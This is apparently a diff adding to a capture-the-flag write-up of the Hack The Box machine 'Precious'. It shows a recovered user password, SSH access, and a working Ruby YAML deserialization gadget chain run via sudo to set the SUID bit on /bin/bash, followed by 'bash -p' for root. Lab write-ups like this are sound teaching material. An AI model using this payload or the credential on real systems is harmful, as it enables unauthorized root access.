@@ -68,20 +68,71 @@ Looking around a little further, we discover the config file in the /home/ruby/.
 Using henry’s credentials, let’s try to ssh into the server:
 #### henry:Q3c1AqGHtoI0aXAYFH
 
+![ssh_henry](https://github.com/Lynk4/HTB-Writeups/assets/44930131/b9e7cec9-396c-4402-8f32-49ea6e84fbd3)
+
+You may now read the user.txt file and capture the first flag!
+
+![user](https://github.com/Lynk4/HTB-Writeups/assets/44930131/98b34106-d1dd-4ed4-befa-290af7f1f453)
+
+### Privilege Escalation:
+
+Let's explore what we can do now that we're logged in as user henry. To see what we can do with this user account, use:
+
+```
+sudo -l
+```
+
+![priv](https://github.com/Lynk4/HTB-Writeups/assets/44930131/4c333e08-6154-4d8b-b92e-fd6609ae82be)
+
+Henry appears to be able to run the file update_depencies.rb as root.
+
+It uses YAML.load, which is vulnerable to deserialization attack. You can read more about YAML deserialization attacks here:
+
+https://github.com/DevComputaria/KnowledgeBase/blob/master/pentesting-web/deserialization/python-yaml-deserialization.md
+
+In order for our remote code execution to work, we will need to craft a payload inside a yml file called dependencies.yml. Using the above link, I created the file below on the server, changing the git_set to id:
 
 
 
+save it as a dependencies.yml in the remote machine...
 
 
+```
+---
+- !ruby/object:Gem::Installer
+    i: x
+- !ruby/object:Gem::SpecFetcher
+    i: y
+- !ruby/object:Gem::Requirement
+  requirements:
+    !ruby/object:Gem::Package::TarReader
+    io: &1 !ruby/object:Net::BufferedIO
+      io: &1 !ruby/object:Gem::Package::TarReader::Entry
+         read: 0
+         header: "abc"
+      debug_output: &1 !ruby/object:Net::WriteAdapter
+         socket: &1 !ruby/object:Gem::RequestSet
+             sets: !ruby/object:Net::WriteAdapter
+                 socket: !ruby/module 'Kernel'
+                 method_id: :system
+             git_set: chmod u+s /bin/bash
+         method_id: :resolve
+```
 
+Run the file:
 
+```
+henry@precious:~$ sudo /usr/bin/ruby /opt/update_dependencies.rb
+```
 
+And finally run:
 
+```
+bash -p
+```
 
+You made it to the finish line! Now collect your prize:
 
+![root](https://github.com/Lynk4/HTB-Writeups/assets/44930131/c6cfbeb1-19ce-41fc-8358-553c822cd801)
 
-
-
-
-
-
+You just pwned Precious!........
